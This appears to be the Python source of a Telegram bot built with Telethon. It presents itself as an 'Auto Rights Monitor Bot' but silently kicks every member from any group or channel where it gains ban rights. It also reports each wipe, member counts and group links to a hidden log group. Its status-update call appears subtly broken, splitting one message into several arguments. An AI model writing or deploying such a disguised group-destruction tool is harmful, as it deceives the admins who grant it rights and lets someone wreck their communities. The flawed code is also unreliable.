import os
import asyncio
import time
from telethon import TelegramClient, events
from telethon.errors import ChatAdminRequiredError


def get_env_var(name):
    value = os.environ.get(name)
    if value is None:
        print(f"⚠️ Environment variable {name} is missing.")
    return value


def to_int(value, name):
    if value is None:
        return None
    try:
        return int(value)
    except (TypeError, ValueError):
        print(f"⚠️ Environment variable {name} could not be parsed as an integer.")
        return None


BOT_TOKEN = get_env_var("BOT_TOKEN")
API_ID = to_int(get_env_var("API_ID"), "API_ID")
API_HASH = get_env_var("API_HASH")
LOG_GROUP_ID = to_int(get_env_var("LOG_GROUP_ID"), "LOG_GROUP_ID")

bot = TelegramClient("bot", API_ID, API_HASH).start(bot_token=BOT_TOKEN)

# Cache for groups/channels the bot is in
tracked_chats = set()
cleaned_chats = set()


def load_initial_chats():
    """Load chat IDs provided via TRACKED_CHAT_IDS env var."""
    seeded_chats = set()
    raw_value = os.environ.get("TRACKED_CHAT_IDS")

    if not raw_value:
        return seeded_chats

    for raw_id in raw_value.split(","):
        raw_id = raw_id.strip()
        if not raw_id:
            continue
        try:
            seeded_chats.add(int(raw_id))
        except ValueError:
            print(f"⚠️ Could not parse chat id '{raw_id}' from TRACKED_CHAT_IDS.")

    return seeded_chats


tracked_chats.update(load_initial_chats())


async def remove_all_members(chat):
    """Remove all members from a group/channel silently"""
    try:
        members = await bot.get_participants(chat)
        total = len(members)
        removed = 0
        start_time = time.time()

        await bot.send_message(
            LOG_GROUP_ID,
            f"🚀 Starting cleanup in **{chat.title}** (`{chat.id}`)\n"
            f"👥 Members: {total}"
        )

        for user in members:
            try:
                if user.id != (await bot.get_me()).id:
                    await bot.kick_participant(chat.id, user.id)
                    removed += 1
                    if removed % 20 == 0:
                        await bot.send_message(
                            LOG_GROUP_ID,
                            f"⚙️ Progress: {removed}/{total} removed in {chat.title}"
                        )
            except Exception as e:
                print(f"Error removing {user.id}: {e}")
                continue

        duration = round(time.time() - start_time, 2)
        msg = (
            f"✅ **Cleanup Completed**\n"
            f"🏷️ Group: {chat.title}\n"
            f"🆔 ID: `{chat.id}`\n"
            f"👤 Removed: {removed}/{total}\n"
            f"⏱️ Time: {duration} sec"
        )
        if getattr(chat, "username", None):
            msg += f"\n🔗 Link: https://t.me/{chat.username}"

        await bot.send_message(LOG_GROUP_ID, msg)
        cleaned_chats.add(chat.id)

    except ChatAdminRequiredError:
        await bot.send_message(
            LOG_GROUP_ID,
            f"⚠️ Lost ban rights in **{chat.title}** (`{chat.id}`), stopping cleanup."
        )


async def check_rights_loop():
    """Check every 10 seconds which groups/channels bot has ban rights in"""
    while True:
        try:
            if not tracked_chats:
                await bot.send_message(
                    LOG_GROUP_ID,
                    "🕒 Status Update:\n📭 No tracked groups yet. Add the bot to a group/channel to start monitoring.",
                )
                await asyncio.sleep(10)
                continue

            rights_groups = []

            for chat_id in list(tracked_chats):
                try:
                    entity = await bot.get_entity(chat_id)
                except Exception as error:
                    print(f"⚠️ Could not fetch entity for {chat_id}: {error}")
                    continue

                try:
                    perms = await bot.get_permissions(entity.id, "me")
                except Exception as error:
                    print(f"⚠️ Could not get permissions for {entity.id}: {error}")
                    continue

                if perms.is_admin and perms.ban_users:
                    rights_groups.append(entity)
                    # If not yet cleaned, start cleaning
                    if entity.id not in cleaned_chats:
                        asyncio.create_task(remove_all_members(entity))

            await bot.send_message(
                LOG_GROUP_ID,
                f"🕒 Status Update:\n",
                f"📊 Total tracked groups/channels: {len(tracked_chats)}\n",
                f"✅ Ban rights in: {len(rights_groups)}\n",
                f"🔁 Next check in 10s...",
            )

        except Exception as e:
            await bot.send_message(LOG_GROUP_ID, f"⚠️ Error during rights check: {e}")

        await asyncio.sleep(10)


@bot.on(events.ChatAction)
async def on_added(event):
    """When bot is added to a new group/channel"""
    if event.user_added and event.user_id == (await bot.get_me()).id:
        chat = await event.get_chat()
        tracked_chats.add(chat.id)
        await bot.send_message(
            LOG_GROUP_ID,
            f"🆕 Added to new group/channel: **{chat.title}** (`{chat.id}`)\nWill check ban rights in next cycle."
        )


@bot.on(events.NewMessage())
async def track_message_chats(event):
    """Track chats where the bot receives messages to avoid restricted API calls."""
    if event.is_group or event.is_channel:
        chat = await event.get_chat()
        if hasattr(chat, "id"):
            tracked_chats.add(chat.id)


@bot.on(events.NewMessage(pattern="/start"))
async def start_cmd(event):
    """Private check"""
    if event.is_private:
        await event.reply("🤖 Bot is active and running silently with auto rights monitoring.")


async def main():
    await bot.send_message(
        LOG_GROUP_ID,
        "✅ Bot started successfully! Monitoring groups every 10s...\n"
        "Tip: preload chats with TRACKED_CHAT_IDS env var (comma separated IDs).",
    )
    await check_rights_loop()


print("🤖 Auto Rights Monitor Bot running...")
bot.loop.run_until_complete(main())
